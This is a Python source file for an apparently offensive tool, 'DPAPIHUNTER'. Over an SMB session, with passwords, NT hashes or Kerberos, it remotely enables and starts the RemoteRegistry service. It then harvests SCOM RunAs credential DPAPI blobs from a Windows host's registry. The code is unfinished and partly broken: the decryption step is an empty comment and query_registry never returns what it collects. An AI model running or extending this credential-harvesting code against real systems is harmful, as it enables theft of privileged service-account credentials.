import asyncio

from lib.logger import logger
from lib.sessions import smb_session
from lib.scripts.helpers import HELPERS

from aiosmb.dcerpc.v5.rpcrt import DCERPCException
from aiosmb.commons.interfaces.machine import SMBMachine
from aiosmb.dcerpc.v5.common.service import ServiceStatus


#disable aiosmb logging
import logging
logging.getLogger('aiosmb').setLevel(logging.ERROR)



class DPAPIHUNTER():
    
    def __init__(self, username:str = None, password: str = None, hashes: str = None, aes: str = None, 
                 kerberos: str = False, no_pass: str  =False, domain: str = None, dc_ip: str = None, 
                 ldaps:str = False, fqdn: str = None, verbose: str = False):
        #auth vars
        self.username = username
        self.password= password
        self.hashes=hashes
        self.aes = aes
        self.kerberos = kerberos
        self.no_pass = no_pass
        
        #target vars
        self.domain = domain
        self.dc_ip = dc_ip
        self.protocol = "smb-tcp"
        self.fqdn = fqdn

        #other
        self.verbose = verbose
        self.smb_session = None
        self.machine = None
        self.reg = None


    async def enum_values(self, regpaths:list):
        """Get RunAs crednetial DPAPI blobs"""
        runas_blobs = []
        for runaspath in regpaths:
            hkey, err = await self.reg.OpenRegPath(runaspath)
            if err is not None:
                logger.info(f"[-] Error opening registry path: {runaspath}")
                logger.info(err)
                continue
            logger.debug(f"[*] Querying registry path:{runaspath}")
            val_type, value, err = await self.reg.QueryValue(hkey, "")

            if err is not None:
                break
            runas_blobs.append(value)
            logger.debug(f"[*] Got blob value type: {val_type}")
            logger.debug(f"[+] Got blob value: {value}")
        return runas_blobs
               

    async def enum_keys(self, regpath:str) -> list:
        """Query registry key"""
        keys =[]
        hkey, err = await self.reg.OpenRegPath(regpath)
        if err is not None:
            logger.info("[-] Something went wrong when querying registry keys.")
            logger.info(err)
            return
        i=0
        while True:
            subkey, err = await self.reg.EnumKey(hkey, i)
            i+=1
            if err is not None:
                break
            else:
                keys.append(subkey.strip("\x00"))
        return keys
    
    
    async def query_managment_groups(self) -> list:
        """Queries target host for SCOM Managment Group Names"""

        mg_regpath = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\HealthService\\Parameters\\Management Groups"

        self.reg, err = await self.machine.get_regapi()
        if err is not None:
            logger.info("[-] Something went wrong when trying to interact with the registry")
            logger.info(err)
            return None

        logger.info("[*] Querying target for SCOM Managment Groups...")
        mg_groups = await self.enum_keys(mg_regpath)
        return mg_regpath, mg_groups
    
    async def query_runas_keys(self, mg_groups:list, mg_regpath:str) -> list:
        """Query target host for SCOM RunAs Credential Keys"""
        runas_blob_paths = []
        for mg in mg_groups:
            logger.info(f"[+] Found Management Group Name: {mg}")
            runas_regpath = (mg_regpath + f'\\{mg}\\SSDB\\SSIDs')
            _blob = await self.enum_keys(runas_regpath)
            if _blob:
                for blob in _blob:
                    logger.debug(f"[*] Found potential RunAs credential key: {blob}")
                    runas_blob_paths.append(runas_regpath + f"\\{blob}")
        return runas_blob_paths
        

    async def query_registry(self) -> list:
        """Top level function to enumerate target's registry"""

        try:
            #Query for MGMT Group Names
            mg_regpath, mg_groups = await self.query_managment_groups()

            if not mg_groups:
                logger.info('[-] Could not find Managemet Group names in registry. Target may not be a client.')
                return None 
            
            #Query for runas credential keys
            runas_blob_paths = await self.query_runas_keys(mg_groups, mg_regpath)
            
            if not runas_blob_paths:
                logger.info("[-] Could not find RunAs credential blobs in registry. Target may not be a client.")
                return None
            
            #capture runas dpapi blobs
            runas_blobs = await self.enum_values(runas_blob_paths)
            
            if not runas_blobs:
                logger.info("Could not ")

        except Exception as e:
            logger.info(e)


    async def kick_remotereg(self):
        """Queries and start remote registry on the target host"""
        self.machine = SMBMachine(self.smb_session)
        srv, err = await self.machine.check_service_status("RemoteRegistry")
        logger.info("[*] Checking if remote registry service is running...")
        
        if err is not None and isinstance(err, DCERPCException):
            if err.error_code == 0x5:
                logger.warning("[-] Recived Access Denied error. Admin context is required. Are you local admin?")
                exit()
        if srv is None:
            logger.info("[-] Something went wrong querying the RemoteRegistry Service.")
            exit()
            
        if srv == ServiceStatus.RUNNING:
            logger.info("[+] Remote registry is running.")
            return True
            
        if srv == ServiceStatus.STOPPED:
            logger.info("[-] Registry is in a stopped state. Attempting to start the service...")
            srv, err = await self.machine.start_service("RemoteRegistry")
            if srv == True:
                logger.info("[+] RemoteRegistry started successfully.")
                return True
            
        if srv == ServiceStatus.DISABLED:
            logger.info("[-] Registry is disabled. Attempting to enable the service...")
            srv, err = await self.machine.enable_service("RemoteRegistry")
            if srv == True:
                logger.info("[+] RemoteRegistry Enabled. Attempting to start the service...")
                srv, err = await self.machine.start_service("RemoteRegistry")
                if srv == True:
                    logger.info("[+] RemoteRegistry started successfully.")
                    return True
            else:
                logger.info("Something went wrong when attempting to start the service")
                logger.info(err)
                return False


    async def smbsession(self):
        """Sets up the smb session"""

        auth_options = {
            "domain": self.domain,
            "username": self.username,
            "password": self.password,
            "nt": self.hashes,
            "dcip": self.dc_ip,
            "fqdn": self.fqdn,  
            "protocol": self.protocol,
            "kerberos": self.kerberos,
            "nopass": self.no_pass
        }
    
        smb_client = await smb_session(auth_options) 
        return smb_client   
        
        
        


    async def run(self):
        """Much of this was taken from examples provided by @skelsec"""
        HELPERS.create_db()
        if not self.smb_session:                               
            self.smb_session = await self.smbsession()    
        

        remote_reg = await self.kick_remotereg() 
        
        if not remote_reg:
            exit()
            
        runas_blobs = await self.query_registry()
        
        if not runas_blobs:
            exit()
        
        #dpapi time


            
        
            
            
